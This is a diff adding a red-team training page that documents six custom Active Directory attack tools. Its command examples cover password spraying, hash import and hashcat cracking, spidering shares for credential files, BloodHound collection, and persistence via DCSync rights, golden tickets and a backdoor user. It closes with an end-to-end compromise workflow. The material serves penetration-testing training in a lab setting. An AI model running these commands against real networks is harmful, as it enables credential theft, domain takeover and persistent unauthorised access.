@@ -1,0 +1,275 @@
+---
+layout: training-page
+title: "AD Engagement Tools — Red Team Academy"
+module: "Tool Development"
+tags:
+  - active-directory
+  - custom-tools
+  - lateral-movement
+  - credential-management
+  - password-spray
+  - bloodhound
+  - persistence
+page_key: "tooldev-ad-engagement-tools"
+render_with_liquid: false
+---
+<h1>AD Engagement Tools</h1>
+
+  <p>Six custom tools purpose-built for Active Directory red team engagements. These fill operational gaps between existing tools &mdash; managing credentials across hosts, spraying safely within lockout policies, spidering shares for loot, tracking lateral movement progress, automating BloodHound collection, and installing/auditing persistence.</p>
+
+  <p>All tools are installed by the <a href="/fundamentals/attacker-setup/">attacker setup script</a> and available as <code>rta-*</code> commands.</p>
+
+  <h2>rta-credstore &mdash; Credential Manager</h2>
+
+  <p>The core problem: during an AD engagement you collect credentials from dozens of sources (secretsdump, Kerberoasting, LSASS dumps, config files) and need to track which creds work on which hosts. This tool maintains a local encrypted database of all credentials and their test results.</p>
+
+  <pre><code># Add credentials manually
+rta-credstore add -u jsmith -p 'P@ssw0rd!' -d corp.local
+rta-credstore add -u admin -H 'aad3b435b51404ee:5fbc3d5fec8206a30f4b6c473d68ae76' -d corp.local
+
+# Import from secretsdump output
+rta-credstore import --file ntds-dump.txt --format secretsdump
+
+# Import Kerberoast hashes
+rta-credstore import --file kerberoast-hashes.txt --format kerberoast
+
+# List all credentials
+rta-credstore list
+rta-credstore list --domain corp.local --type hash
+
+# Test a specific credential against a target
+rta-credstore test -u jsmith -t 192.168.56.10 --proto smb
+
+# Spray ALL credentials against a target (or CIDR)
+rta-credstore spray --target 192.168.56.0/24 --proto smb --delay 5
+
+# Export for cracking
+rta-credstore export --format hashcat -o hashes.txt
+
+# Engagement summary
+rta-credstore summary</code></pre>
+
+  <p>The credential database tracks which hosts each credential has been tested against, which ones were valid, and which have admin access. It prevents wasting time retesting credentials and avoids accidental lockouts from testing the same cred twice.</p>
+
+  <h2>rta-sprayguard &mdash; Policy-Aware Password Sprayer</h2>
+
+  <p>Queries the domain password policy <strong>before</strong> spraying and automatically stays within lockout thresholds. Handles the math of "N attempts then wait M minutes" so you don't lock accounts.</p>
+
+  <pre><code># Check the password policy first
+rta-sprayguard policy -t 192.168.56.10 -d corp.local -u jsmith -p 'P@ss'
+
+# Output:
+#   Lockout Threshold:    5 attempts
+#   Observation Window:   30 minutes
+#   Safe spray: 3 attempts per user, then wait 30 minutes
+
+# Spray with automatic policy enforcement
+rta-sprayguard spray -t 192.168.56.10 -d corp.local \
+  -U users.txt -P passwords.txt \
+  --auth-user jsmith --auth-pass 'P@ss'
+
+# Single password against all users
+rta-sprayguard spray -t 192.168.56.10 -d corp.local \
+  -U users.txt -p 'Spring2024!'
+
+# Force spray without policy check (dangerous)
+rta-sprayguard spray -t 192.168.56.10 -d corp.local \
+  -U users.txt -P passwords.txt --force --max-attempts 2</code></pre>
+
+  <p>Key safety features:</p>
+  <ul>
+    <li>Queries lockout threshold before spraying &mdash; calculates safe attempt count</li>
+    <li>Auto-waits between spray windows (observation window duration)</li>
+    <li>Immediately stops spraying a user if <code>STATUS_ACCOUNT_LOCKED_OUT</code> is returned</li>
+    <li>Skips users that already have valid credentials</li>
+    <li>Conservative defaults (2 attempts, 30 minute wait) when policy query fails</li>
+  </ul>
+
+  <h2>rta-sharespider &mdash; SMB Share Spider</h2>
+
+  <p>Recursively searches SMB shares for files that commonly contain credentials: KeePass databases, config files with connection strings, scripts with hardcoded passwords, private keys, GPP passwords, and more. Optionally downloads and scans file contents for credential patterns.</p>
+
+  <pre><code># Spider all readable shares on a target
+rta-sharespider -t 192.168.56.10 -u jsmith -p 'P@ss' -d corp.local
+
+# Spider with content scanning (downloads and greps for passwords)
+rta-sharespider -t 192.168.56.10 -u jsmith -p 'P@ss' -d corp.local --download
+
+# Spider specific shares
+rta-sharespider -t 192.168.56.10 -u admin -H 'LM:NT' -d corp --shares SYSVOL IT
+
+# Spider multiple targets from a file
+rta-sharespider -t targets.txt -u jsmith -p 'P@ss' -d corp -o findings.json</code></pre>
+
+  <p>What it looks for:</p>
+  <table>
+    <tr><th>Category</th><th>File Patterns</th></tr>
+    <tr><td>Credential stores</td><td><code>.kdbx</code>, <code>.pfx</code>, <code>.pem</code>, <code>.key</code>, <code>.ppk</code>, <code>id_rsa</code></td></tr>
+    <tr><td>Config files</td><td><code>web.config</code>, <code>.env</code>, <code>appsettings.json</code>, <code>wp-config.php</code>, <code>.htpasswd</code></td></tr>
+    <tr><td>Scripts</td><td><code>.ps1</code>, <code>.bat</code>, <code>.vbs</code> (scanned for hardcoded credentials)</td></tr>
+    <tr><td>AD/Windows</td><td><code>unattend.xml</code>, <code>groups.xml</code> (GPP), <code>NTDS.dit</code>, <code>SAM</code>, <code>SECURITY</code></td></tr>
+    <tr><td>Password files</td><td><code>pass*.txt</code>, <code>password*.xlsx</code>, <code>cred*.csv</code></td></tr>
+    <tr><td>Network</td><td><code>.ovpn</code>, <code>.rdp</code>, <code>.rdg</code>, <code>.ssh/config</code></td></tr>
+  </table>
+
+  <p>Content scanning checks downloaded files for patterns like <code>password=</code>, <code>connectionstring</code>, <code>PRIVATE KEY</code>, <code>aws_secret_access_key</code>, <code>ConvertTo-SecureString</code>, and 15+ other credential indicators.</p>
+
+  <h2>rta-bhingest &mdash; BloodHound Collection &amp; Attack Paths</h2>
+
+  <p>One-command BloodHound data collection plus automated LDAP queries for high-value attack paths. Generates a report of Kerberoastable accounts, AS-REP roastable users, unconstrained delegation, GPP passwords, LAPS passwords, and user descriptions that may contain credentials.</p>
+
+  <pre><code># Full collection + attack path queries
+rta-bhingest -t 192.168.56.10 -d corp.local -u jsmith -p 'P@ss'
+
+# With hash authentication
+rta-bhingest -t 192.168.56.10 -d corp.local -u admin -H 'NT_HASH'
+
+# Output:
+#   bloodhound-20240415-143022/
+#   ├── *_bloodhound.zip          # Import into BloodHound CE
+#   ├── kerberoast.txt            # Hashcat -m 13100 ready
+#   ├── asrep.txt                 # Hashcat -m 18200 ready
+#   └── attack-paths.txt          # Summary of all findings</code></pre>
+
+  <p>Queries run automatically:</p>
+  <ul>
+    <li>Kerberoastable accounts (SPN set)</li>
+    <li>AS-REP roastable accounts (PreAuth disabled)</li>
+    <li>Unconstrained delegation (computer accounts)</li>
+    <li>Accounts with PASSWD_NOTREQD flag</li>
+    <li>AdminCount=1 users (privileged account history)</li>
+    <li>User descriptions (frequently contain passwords)</li>
+    <li>GPP passwords (Group Policy Preferences)</li>
+    <li>LAPS passwords (if readable)</li>
+  </ul>
+
+  <h2>rta-adpersist &mdash; AD Persistence Installer &amp; Auditor</h2>
+
+  <p>Automates common AD persistence techniques and includes a cleanup mode for post-engagement removal. Each method includes OPSEC risk rating and detection context.</p>
+
+  <pre><code># List available persistence methods with OPSEC ratings
+rta-adpersist list-methods
+
+# Audit existing persistence on the domain
+rta-adpersist audit -t 192.168.56.10 -u DA_admin -p 'Pass' -d corp.local
+
+# Grant DCSync rights to a user
+rta-adpersist install --method dcsync-acl \
+  -t 192.168.56.10 -u DA_admin -p 'Pass' -d corp.local \
+  --target-user backdoor_user
+
+# Extract krbtgt hash for golden ticket
+rta-adpersist install --method golden-ticket \
+  -t 192.168.56.10 -u DA_admin -p 'Pass' -d corp.local
+
+# Add a rogue machine account
+rta-adpersist install --method machine-account \
+  -t 192.168.56.10 -u jsmith -p 'Pass' -d corp.local
+
+# Clean up — remove DCSync ACL after engagement
+rta-adpersist clean --method dcsync-acl \
+  -t 192.168.56.10 -u DA_admin -p 'Pass' -d corp.local \
+  --target-user backdoor_user</code></pre>
+
+  <p>Supported persistence methods:</p>
+  <table>
+    <tr><th>Method</th><th>OPSEC</th><th>Description</th></tr>
+    <tr><td><code>dcsync-acl</code></td><td>MEDIUM</td><td>Grant replication rights to a user (DCSync without DA)</td></tr>
+    <tr><td><code>golden-ticket</code></td><td>LOW/HIGH</td><td>Extract krbtgt hash, forge TGT for any user</td></tr>
+    <tr><td><code>silver-ticket</code></td><td>LOW</td><td>Forge TGS for specific service (no DC interaction)</td></tr>
+    <tr><td><code>skeleton-key</code></td><td>HIGH</td><td>Patch LSASS on DC for master password</td></tr>
+    <tr><td><code>admin-sdh</code></td><td>MEDIUM</td><td>Modify AdminSDHolder for persistent admin ACL</td></tr>
+    <tr><td><code>sid-history</code></td><td>MEDIUM</td><td>Inject DA SID into user&rsquo;s SID History</td></tr>
+    <tr><td><code>machine-account</code></td><td>LOW</td><td>Add rogue computer to domain (any domain user)</td></tr>
+  </table>
+
+  <h2>rta-lateralmap &mdash; Engagement State Tracker</h2>
+
+  <p>Tracks which hosts you have compromised, what level of access you have, and identifies the next best lateral movement targets. Integrates with rta-credstore to test credentials across the network.</p>
+
+  <pre><code># Add hosts to the map
+rta-lateralmap add-host 192.168.56.10 --name DC01 --role dc --access admin
+rta-lateralmap add-host 192.168.56.20 --name WS01 --role workstation
+rta-lateralmap add-host 192.168.56.30 --name SRV01 --role server --access user
+
+# Import hosts from nmap scan
+rta-lateralmap import-nmap --file nmap-scan.gnmap
+
+# Test lateral movement from a compromised host
+rta-lateralmap scan --from 192.168.56.10
+
+# View the engagement map
+rta-lateralmap map
+
+# Output:
+#   ── Engagement Map (3 hosts) ──
+#
+#   Status  IP                Name            Role     Access  Valid  Admin
+#   ───────────────────────────────────────────────────────────────────────
+#   admin   192.168.56.10     DC01            [DC]     admin   3      2
+#   user    192.168.56.30     SRV01           [SRV]    user    1      0
+#   none    192.168.56.20     WS01            [WS]     none    0      0
+#
+#   ── Lateral Movement Paths ──
+#   192.168.56.10 ==> 192.168.56.30 (cred #2, admin)
+
+# Get suggested next actions
+rta-lateralmap suggest
+
+# Export engagement report
+rta-lateralmap export -o engagement-report.json</code></pre>
+
+  <h2>Tool Integration Workflow</h2>
+
+  <p>The AD tools are designed to work together. Here is a typical engagement workflow:</p>
+
+  <pre><code># 1. Initial foothold — you have domain user creds
+rta-credstore add -u jsmith -p 'Welcome1!' -d corp.local
+
+# 2. Discover hosts and attack paths
+rta-bhingest -t 10.10.10.10 -d corp.local -u jsmith -p 'Welcome1!'
+
+# 3. Import discovered hosts
+rta-lateralmap import-nmap --file nmap-scan.gnmap
+
+# 4. Spider shares for more credentials
+rta-sharespider -t 10.10.10.10 -u jsmith -p 'Welcome1!' -d corp.local --download
+# Found web.config with SA password → add it
+rta-credstore add -u sa -p 'SQLp@ss!' --source 'sharespider:web.config'
+
+# 5. Crack Kerberoast hashes, import results
+hashcat -m 13100 bloodhound-*/kerberoast.txt /opt/wordlists/rockyou.txt
+rta-credstore add -u svc_sql -p 'Summer2024!' -d corp.local --source kerberoast
+
+# 6. Spray new passwords (policy-aware)
+rta-sprayguard spray -t 10.10.10.10 -d corp.local \
+  -U users.txt -p 'Summer2024!' \
+  --auth-user jsmith --auth-pass 'Welcome1!'
+
+# 7. Test all creds for lateral movement
+rta-lateralmap scan --from 10.10.10.10
+
+# 8. Check where we are and what to do next
+rta-lateralmap map
+rta-lateralmap suggest
+
+# 9. Got DA — install persistence
+rta-adpersist install --method golden-ticket \
+  -t 10.10.10.10 -u DA_admin -p 'Pass' -d corp.local
+
+# 10. End of engagement — clean up
+rta-adpersist clean --method dcsync-acl \
+  -t 10.10.10.10 -u DA_admin -p 'Pass' -d corp.local \
+  --target-user backdoor</code></pre>
+
+  <h2>Resources</h2>
+  <ul>
+    <li>Source code &mdash; <code>/scripts/rta-ad-tools/</code> (this repository)</li>
+    <li>AD Enumeration &mdash; <code>/active-directory/ad-enumeration/</code></li>
+    <li>Kerberoasting &mdash; <code>/active-directory/kerberoasting/</code></li>
+    <li>BloodHound &mdash; <code>/active-directory/bloodhound/</code></li>
+    <li>NTLM Relay &mdash; <code>/active-directory/ntlm-relay/</code></li>
+    <li>AD Persistence &mdash; <code>/active-directory/ad-persistence/</code></li>
+    <li>Lateral Movement &mdash; <code>/post-exploitation/lateral-movement/</code></li>
+    <li>DPAPI Abuse &mdash; <code>/active-directory/dpapi-abuse/</code></li>
+  </ul>
